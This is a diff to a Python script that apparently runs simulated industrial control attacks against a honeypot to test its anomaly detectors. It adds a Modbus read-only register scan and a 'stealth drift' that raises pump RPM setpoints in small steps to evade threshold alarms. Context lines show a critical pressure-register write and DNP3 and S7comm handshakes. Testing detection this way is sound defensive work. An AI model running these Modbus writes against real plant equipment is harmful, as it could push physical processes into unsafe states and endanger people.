@@ -6,6 +6,8 @@ Simulates realistic ICS attack scenarios against the honeypot:
   2. Replay Attack       – spoofs benign telemetry to the InfluxDB historian
   3. DNP3 Probe          – sends a DNP3 link-layer request to port 20000
   4. S7comm Probe        – raw TCP connect + COTP/S7 handshake to port 102
+  5. Reconnaissance Only – read-only Modbus (FC3) scan (no writes)
+  6. EWMA Stealth Drift  – slowly increments pressure register to evade thresholds
 
 All results are written back to InfluxDB (attack_results measurement)
 so they are visible in Grafana.
@@ -48,6 +50,7 @@ def log_attack_result(attack_name: str, success: bool, detail: str = ""):
     except Exception as e:
         print(f"  [DB] Failed to log result: {e}")
 
+
 # ── 1. Semantic Injection ──────────────────────────────────────────────────────
 def semantic_injection():
     print("\n" + "="*60)
@@ -61,7 +64,7 @@ def semantic_injection():
     try:
         client = ModbusTcpClient(TARGET_IP, port=MODBUS_PORT)
         if client.connect():
-            # Write critically high value to pressure register (FC6)
+            # FC6: Write single register – critically high value
             res = client.write_register(100, 5000)
             if not res.isError():
                 success = True
@@ -143,7 +146,6 @@ def dnp3_probe():
         crc = _crc16(raw)
         return raw + struct.pack('<H', crc)
 
-    # Reset Link States (FC=0x40 PRM, DIR=1)
     frame = _frame(ctrl=0x40, dst=1, src=3)
 
     success = False
@@ -181,7 +183,6 @@ def s7comm_probe():
     print("="*60)
     print("  Strategy: Send COTP connection request + S7 NEGOTIATE PDU.")
 
-    # COTP CR (Connect Request) over TCP
     cotp_cr = bytes([
         0x03, 0x00, 0x00, 0x16,   # TPKT: version=3, length=22
         0x11,                     # COTP length
@@ -189,9 +190,9 @@ def s7comm_probe():
         0x00, 0x00,               # dst reference
         0x00, 0x01,               # src reference
         0x00,                     # class
-        0xc1, 0x02, 0x01, 0x00,   # src TSAP
-        0xc2, 0x02, 0x01, 0x02,   # dst TSAP
-        0xc0, 0x01, 0x09,         # TPDU size
+        0xc1, 0x02, 0x01, 0x00,  # src TSAP
+        0xc2, 0x02, 0x01, 0x02,  # dst TSAP
+        0xc0, 0x01, 0x09,        # TPDU size
     ])
 
     success = False
@@ -225,6 +226,102 @@ def s7comm_probe():
     return success
 
 
+# ── 5. Reconnaissance-Only Scan (FC3 reads, no writes) ───────────────────────
+def reconnaissance_only():
+    """
+    Simulates a passive reconnaissance attacker:
+    Sends only Modbus FC3 (Read Holding Registers) commands
+    without any writes. Should be logged but NOT trigger anomaly alerts.
+    This tests that the honeypot correctly distinguishes read-only from
+    write-based attack paths (§4.6.1 point 4).
+    """
+    print("\n" + "="*60)
+    print("[ATTACK 5] Reconnaissance-Only (FC3 Read Scan)")
+    print("="*60)
+    print("  Strategy: Enumerate all register blocks with FC3 read commands.")
+    print("  Expected: Logged but NOT flagged as anomaly.")
+
+    success = False
+    detail  = ""
+    regs_found = []
+
+    try:
+        client = ModbusTcpClient(TARGET_IP, port=MODBUS_PORT)
+        if client.connect():
+            # Scan key register ranges
+            for start_reg in [0, 100, 200, 250]:
+                res = client.read_holding_registers(start_reg, 4)
+                if hasattr(res, 'registers') and not res.isError():
+                    regs_found.append(f"[{start_reg}-{start_reg+3}]: {res.registers}")
+                    print(f"  [+] FC3 Read reg {start_reg}-{start_reg+3}: {res.registers}")
+                else:
+                    print(f"  [-] FC3 Read reg {start_reg}: error/no data")
+                time.sleep(0.5)
+
+            client.close()
+            success = len(regs_found) > 0
+            detail  = f"Enumerated {len(regs_found)} register blocks"
+        else:
+            detail = "Could not connect to Modbus TCP"
+            print(f"  [-] FAILED  – {detail}")
+    except Exception as e:
+        detail = str(e)
+        print(f"  [-] ERROR   – {detail}")
+
+    log_attack_result("reconnaissance_only", success, detail)
+    return success
+
+
+# ── 6. EWMA Stealth Drift Attack ───────────────────────────────────────────────
+def ewma_stealth_drift():
+    """
+    Slowly increments the pump setpoint (register 200) in small steps
+    over a long window to evade fixed-threshold anomaly detection.
+    This is the stealth manipulation scenario from §4.6.1 point 3.
+    The EWMA/CUSUM detector in the ML engine is designed to catch this.
+    """
+    print("\n" + "="*60)
+    print("[ATTACK 6] EWMA Stealth Drift (Slow Setpoint Manipulation)")
+    print("="*60)
+    print("  Strategy: Increment pump RPM register by 50 every 3 seconds.")
+    print("  Goal: Gradually push process toward unsafe operating range.")
+    print("  Expected: EWMA/CUSUM detector fires after cumulative drift.")
+
+    success     = False
+    detail      = ""
+    steps       = 15       # number of increments
+    step_size   = 50       # RPM per step  (small = stealthy)
+    step_delay  = 3        # seconds between steps
+    start_rpm   = 1200     # baseline
+    current_rpm = start_rpm
+
+    try:
+        client = ModbusTcpClient(TARGET_IP, port=MODBUS_PORT)
+        if client.connect():
+            for i in range(steps):
+                current_rpm = min(start_rpm + (i + 1) * step_size, 3000)
+                res = client.write_register(200, current_rpm)   # actuator register
+                if not res.isError():
+                    print(f"  [+] Step {i+1:02d}/{steps}: RPM → {current_rpm}")
+                    success = True
+                else:
+                    print(f"  [-] Step {i+1:02d}/{steps}: write error")
+                time.sleep(step_delay)
+            client.close()
+            detail = (f"Drifted RPM from {start_rpm} → {current_rpm} "
+                      f"in {steps} steps over {steps * step_delay}s")
+            print(f"  Result: {detail}")
+        else:
+            detail = "Could not connect to Modbus TCP"
+            print(f"  [-] FAILED – {detail}")
+    except Exception as e:
+        detail = str(e)
+        print(f"  [-] ERROR – {detail}")
+
+    log_attack_result("ewma_stealth_drift", success, detail)
+    return success
+
+
 # ── Entry point ────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     print("\n" + "#"*60)
@@ -239,6 +336,10 @@ if __name__ == "__main__":
     results["dnp3_probe"]           = dnp3_probe()
     time.sleep(2)
     results["s7comm_probe"]         = s7comm_probe()
+    time.sleep(2)
+    results["reconnaissance_only"]  = reconnaissance_only()
+    time.sleep(2)
+    results["ewma_stealth_drift"]   = ewma_stealth_drift()
 
     print("\n" + "="*60)
     print("SIMULATION SUMMARY")
